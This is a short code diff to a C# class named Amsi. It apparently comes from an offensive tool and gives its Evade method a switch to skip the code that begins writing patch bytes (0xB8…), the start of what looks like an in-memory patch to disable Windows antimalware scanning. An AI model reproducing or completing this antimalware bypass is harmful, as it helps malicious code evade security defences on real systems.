@@ -419,8 +419,11 @@ public class Amsi
 
     static byte[] x86 = new byte[8];
 
-    public static void Evade()
+    public static void Evade(bool evade)
     {
+        if (!evade)
+            return;
+
         if (is64Bit())
         {
             x64[0] = 0xB8;
